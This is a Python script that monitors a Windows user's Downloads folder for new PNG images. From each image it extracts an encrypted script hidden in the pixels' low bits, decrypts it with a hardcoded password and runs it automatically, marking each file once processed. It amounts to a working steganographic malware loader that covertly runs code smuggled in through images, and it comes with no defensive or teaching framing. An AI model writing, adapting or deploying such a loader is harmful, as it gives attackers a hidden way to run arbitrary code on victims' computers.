import os
import json
import time
import subprocess
import ctypes
from PIL import Image
from cryptography.fernet import Fernet
import hashlib
import base64
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import hashes

# ========== Hidden extraction code ==========
def derive_key(password: str, salt: bytes = b'stego_salt') -> bytes:
    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA256(),
        length=32,
        salt=salt,
        iterations=100_000,
        backend=default_backend()
    )
    return base64.urlsafe_b64encode(kdf.derive(password.encode()))


def unhide(image_file_path, output_file_path, password):
    im = Image.open(image_file_path)
    px = im.load()
    binary_data = []

    for i in range(im.size[0]):
        for j in range(im.size[1]):
            R, G, B = px[i, j][:3]
            binary_data.extend([R & 1, G & 1, B & 1])
            if binary_data[-32:] == [0] * 32:
                break
        else:
            continue
        break

    byte_array = bytearray()
    for i in range(0, len(binary_data) - 32, 8):
        byte = 0
        for bit in binary_data[i:i+8]:
            byte = (byte << 1) | bit
        byte_array.append(byte)

    key = derive_key(password)
    fernet = Fernet(key)
    try:
        decrypted = fernet.decrypt(bytes(byte_array))
    except Exception as e:
        print(f"[!] Decryption failed for {image_file_path}: {e}")
        return False

    try:
        with open(output_file_path, "wb") as f:
            f.write(decrypted)
        print(f"[+] Extracted script saved to '{output_file_path}'.")
        return True
    except Exception as e:
        print(f"[!] Error writing extracted script: {e}")
        return False

# ========== Main Monitor code ==========

# Get the real Downloads path (works even if user changed its location)
from pathlib import Path
DOWNLOADS_DIR = str(Path.home() / "Downloads")

TRACK_FILE = "executed_images.json"
PASSWORD = "cybersecurity"
EXTRACTED_SCRIPT = "extracted_script.py"

def load_executed():
    if os.path.exists(TRACK_FILE):
        with open(TRACK_FILE, 'r') as f:
            return json.load(f)
    else:
        return []

def save_executed(executed_list):
    with open(TRACK_FILE, 'w') as f:
        json.dump(executed_list, f, indent=4)

def is_admin():
    # Optional: You can check if running as Administrator
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def monitor_folder():
    print("[*] Monitoring Downloads folder for new PNG images (Windows Mode)...")
    executed_images = load_executed()

    while True:
        try:
            for filename in os.listdir(DOWNLOADS_DIR):
                if filename.lower().endswith(".png"):
                    full_path = os.path.join(DOWNLOADS_DIR, filename)
                    
                    if filename not in executed_images:
                        print(f"[!] Found new PNG: {filename}")
                        success = unhide(full_path, EXTRACTED_SCRIPT, PASSWORD)
                        if success:
                            try:
                                subprocess.run(["python", EXTRACTED_SCRIPT], check=True, shell=True)
                                print(f"[+] Successfully ran {EXTRACTED_SCRIPT}")
                                executed_images.append(filename)
                                save_executed(executed_images)
                            except subprocess.CalledProcessError as e:
                                print(f"[!] Error running extracted script: {e}")
                        else:
                            print(f"[!] Failed to extract hidden script from {filename}")
                            executed_images.append(filename)
                            save_executed(executed_images)
        except Exception as e:
            print(f"[!] Error during monitoring: {e}")

        time.sleep(5)  # Check every 5 seconds

if __name__ == "__main__":
    if not is_admin():
        print("[!] Warning: It's recommended to run as Administrator for full access to Downloads folder.")
    monitor_folder()
